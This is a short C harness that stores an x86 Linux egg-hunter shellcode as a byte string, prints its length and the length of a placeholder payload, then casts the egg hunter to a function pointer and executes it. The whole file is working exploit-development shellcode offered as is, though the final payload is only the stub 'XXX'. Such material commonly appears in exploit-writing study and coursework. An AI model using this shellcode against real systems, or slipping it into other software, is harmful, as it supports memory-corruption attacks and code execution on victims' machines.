#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\xff\xe7";

unsigned char code[] = \
"XXX";

int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	printf("Egghunter Length:  %d\n", strlen(egg_hunter));
	int (*ret)() = (int(*)())egg_hunter;
	ret();
}
